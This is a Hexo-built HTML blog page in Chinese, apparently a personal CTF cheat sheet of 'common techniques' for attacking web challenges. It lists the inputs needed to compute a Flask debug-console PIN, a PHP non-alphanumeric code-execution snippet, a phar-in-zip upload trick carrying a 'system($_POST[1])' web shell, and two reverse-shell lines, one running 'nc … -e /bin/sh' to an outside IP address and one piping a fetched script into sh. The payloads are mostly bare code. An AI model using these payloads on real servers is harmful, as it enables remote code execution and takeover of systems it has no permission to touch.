@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>css_0k的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Flask算PINPINflask开启debug模式下，进行代码调试模式的进入密码，输入pin码进入调试模式 进入代码测试模式：xxx&#x2F;console Flask是怎么生成PIN的？ python3.6和python3.8中生成PIN的算法不同 ​                        ————md5变成了sha1 PIN生成要素  username   getpass.getuser()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="css_0k的博客">
+<meta property="og:url" content="https://css0k.github.io/2022/03/19/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="css_0k的博客">
+<meta property="og:description" content="Flask算PINPINflask开启debug模式下，进行代码调试模式的进入密码，输入pin码进入调试模式 进入代码测试模式：xxx&#x2F;console Flask是怎么生成PIN的？ python3.6和python3.8中生成PIN的算法不同 ​                        ————md5变成了sha1 PIN生成要素  username   getpass.getuser()">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-19T13:29:27.831Z">
+<meta property="article:modified_time" content="2022-04-16T12:24:49.982Z">
+<meta property="article:author" content="css_0k">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="css_0k的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">css_0k的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://css0k.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-常用姿势" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/03/19/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="article-date">
+  <time datetime="2022-03-19T13:29:27.831Z" itemprop="datePublished">2022-03-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Flask算PIN"><a href="#Flask算PIN" class="headerlink" title="Flask算PIN"></a>Flask算PIN</h2><h4 id="PIN"><a href="#PIN" class="headerlink" title="PIN"></a>PIN</h4><p>flask开启debug模式下，进行代码调试模式的进入密码，输入pin码进入调试模式</p>
+<p>进入代码测试模式：xxx/console</p>
+<p>Flask是怎么生成PIN的？</p>
+<p><strong>python3.6和python3.8中生成PIN的算法不同</strong></p>
+<p>​                        ————md5变成了sha1</p>
+<p>PIN生成要素</p>
+<blockquote>
+<p>username   getpass.getuser()  文件中读取etc/passwd</p>
+<p>modname  getattr(mod,”_file_“,None)读取</p>
+<p>appname   getattr(app,”_file_“,type(app)._name_)</p>
+<p>moddir   getattr(mod,”_file_“,None)</p>
+<p>uuidnode  uuid.getnode()   /sys/class/net/eth0/address   得到16进制转10进制             2485377581159</p>
+<p>machine_id通过合并3个文件的指定值确定，文件中读取</p>
+<p>a. /etc/machine_id</p>
+<p>b./proc/sys/kernel/random/boot_id</p>
+<p>c./proc/self/cgroup</p>
+</blockquote>
+<h2 id="php无字母数字rce"><a href="#php无字母数字rce" class="headerlink" title="php无字母数字rce"></a>php无字母数字rce</h2><p>ascii码表  非字母数字33-47  58-64  91-96  123-126</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); <span class="comment">//a</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>++; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$___</span>=++<span class="variable">$__</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$____</span>=++<span class="variable">$___</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$____</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$______</span>=++<span class="variable">$_____</span>; <span class="comment">//f</span></span><br><span class="line"><span class="variable">$_______</span>=++<span class="variable">$______</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$________</span>=++<span class="variable">$_______</span>; <span class="comment">//h</span></span><br><span class="line"><span class="variable">$_________</span>=++<span class="variable">$________</span>; <span class="comment">//i</span></span><br><span class="line"><span class="variable">$__________</span>=++<span class="variable">$_________</span>; <span class="comment">//j</span></span><br><span class="line"><span class="variable">$___________</span>=++<span class="variable">$__________</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$____________</span>=++<span class="variable">$___________</span>; <span class="comment">//l</span></span><br><span class="line"><span class="variable">$_____________</span>=++<span class="variable">$____________</span>; <span class="comment">//m</span></span><br><span class="line"><span class="variable">$______________</span>=++<span class="variable">$_____________</span>; <span class="comment">//n</span></span><br><span class="line"><span class="variable">$_______________</span>=++<span class="variable">$______________</span>; <span class="comment">//o</span></span><br><span class="line"><span class="variable">$________________</span>=++<span class="variable">$_______________</span>; <span class="comment">//p</span></span><br><span class="line"><span class="variable">$_________________</span>=++<span class="variable">$________________</span>; <span class="comment">//q</span></span><br><span class="line"><span class="variable">$__________________</span>=++<span class="variable">$_________________</span>; <span class="comment">//r</span></span><br><span class="line"><span class="variable">$___________________</span>=++<span class="variable">$__________________</span>; <span class="comment">//s</span></span><br><span class="line"><span class="variable">$____________________</span>=++<span class="variable">$___________________</span>; <span class="comment">//t</span></span><br><span class="line"><span class="variable">$_____________________</span>=++<span class="variable">$____________________</span>; <span class="comment">//u</span></span><br><span class="line"><span class="variable">$______________________</span>=++<span class="variable">$_____________________</span>; <span class="comment">//v</span></span><br><span class="line"><span class="variable">$_______________________</span>=++<span class="variable">$______________________</span>; <span class="comment">//w</span></span><br><span class="line"><span class="variable">$________________________</span>=++<span class="variable">$_______________________</span>; <span class="comment">//x</span></span><br><span class="line"><span class="variable">$_________________________</span>=++<span class="variable">$________________________</span>; <span class="comment">//y</span></span><br><span class="line"><span class="variable">$__________________________</span>=++<span class="variable">$_________________________</span>; <span class="comment">//z</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="zip上传phar包含"><a href="#zip上传phar包含" class="headerlink" title="zip上传phar包含"></a>zip上传phar包含</h2><h4 id="本地生成phar"><a href="#本地生成phar" class="headerlink" title="本地生成phar"></a>本地生成phar</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;&lt;?php system($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_only=&#x27;on&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="上传文件到-tmp目录，其他目录不可写"><a href="#上传文件到-tmp目录，其他目录不可写" class="headerlink" title="上传文件到/tmp目录，其他目录不可写"></a>上传文件到/tmp目录，其他目录不可写</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/tmp/p.zip&amp;content=<span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt;  //bp中from file读取文件选取上传</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="执行命令，反弹shell，读取flag"><a href="#执行命令，反弹shell，读取flag" class="headerlink" title="执行命令，反弹shell，读取flag"></a>执行命令，反弹shell，读取flag</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">///tmp/p.zip/test&amp;content=&amp;1=nc 101.42.138.194 9999 -e /bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/?url=https://your-shell.com/101.42.138.194:9999 |sh</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://css0k.github.io/2022/03/19/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" data-id="cl2w3h1ii000ragw51y9salfj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/03/26/%E6%9A%97%E7%BD%91/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          暗网
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/19/nsswp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">nsswp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc%E5%9B%BE%E7%89%87/" rel="tag">misc图片</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" rel="tag">图片隐写</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/misc%E5%9B%BE%E7%89%87/" style="font-size: 10px;">misc图片</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="font-size: 10px;">图片隐写</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/12/%E9%9A%90%E5%86%99%E9%A2%98%E6%80%9D%E8%B7%AF/">图片题思路</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/09/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E7%9F%A5%E8%AF%86/">图片隐写知识</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/05/1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/04/php%E7%89%B9%E6%80%A7/">php特性</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/04/sqli-labs/">sqli-labs</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 css_0k<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
